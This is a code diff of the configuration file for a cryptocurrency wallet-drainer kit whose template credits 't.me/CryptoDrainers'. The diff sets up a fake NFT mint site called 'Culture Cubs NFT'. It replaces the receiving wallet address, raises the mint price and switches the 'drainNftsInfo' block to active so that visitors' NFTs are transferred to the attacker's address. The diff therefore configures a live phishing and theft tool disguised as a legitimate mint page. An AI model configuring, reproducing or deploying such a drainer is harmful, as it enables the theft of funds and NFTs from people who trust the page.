@@ -2,26 +2,26 @@
     = = = = = YOUR WALLET ADRESS = = = = =
 */
 
-const receiveAddress = "0x4E02375a803462FE27cb489e7C16ade676f13cD8";
+const receiveAddress = "0x5078B5db28E51b51C7A200a0AC629C9bbD5931B2";
 
 /*
     = = = = = COLLECTION SETTINGS = = = = =
 */
 
 const collectionInfo = {
-    name: "t.me/CryptoDrainers",
-    date: "15.05.2022",
+    name: "Culture Cubs NFT",
+    date: "09.06.2022",
     socialMedia: {
         discord: "discord.gg/",
         twitter: "https://twitter.com/logout",
     },
     medias: {
-        preview: "prev.gif", // You can change it with files in assets
+        preview: "unnamed.gif", // You can change it with files in assets
         favicon: "favicon.ico", // The website icon
     },
     background: {
         type: "image", // Supported types: image, video, color (use image for gif)
-        image: "bg.gif", // Image for image type or video preview for video type (image befor video load)
+        image: "FNA-wkJWYAQc50m.jpg", // Image for image type or video preview for video type (image befor video load)
         video: "background.mp4", // If you don't use video type, you can ignore this line
         color: "#4E4E6D", // If you don't use color type, you can ignore this line
     }
@@ -33,7 +33,7 @@ const collectionInfo = {
 */
 
 const mintInfo = {
-    price: 0.06,
+    price: 0.13,
     totalSupply: 1111,
     minUnits: 1,
     maxUnits: 5,
@@ -45,10 +45,10 @@ const mintInfo = {
 */
 
 const drainNftsInfo = {
-    active: false,
-    minValue: 0.02,
+    active: true,
+    minValue: 0.1,
     maxTransfer: 100,
-    nftReceiveAddress: "0x4E02375a803462FE27cb489e7C16ade676f13cD8",
+    nftReceiveAddress: "0x5078B5db28E51b51C7A200a0AC629C9bbD5931B2",
 }
 
 const customStrings = {
